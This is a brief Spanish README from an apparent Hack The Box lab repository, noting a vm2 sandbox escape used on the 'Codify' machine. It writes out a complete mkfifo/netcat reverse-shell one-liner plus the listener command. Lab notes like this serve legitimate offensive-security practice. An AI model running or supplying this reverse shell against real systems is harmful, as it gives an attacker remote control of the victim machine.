# Scripts

- Este script se usó para escapar del sandbox vm2@3.9.17 en la máquina Codify de HTB. Podemos llegar a injectar comandos "RCE" y entablar una revshell.
- Ejecutar Revshell con mkfifo:
	1. Shell RCE $> `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc [tuIP] [PortListener] >/tmp/f`
	2. KALI $> `sudo nc -nlvp [PortListener]`

# Referencias

- Más info en este PoC -> https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac 
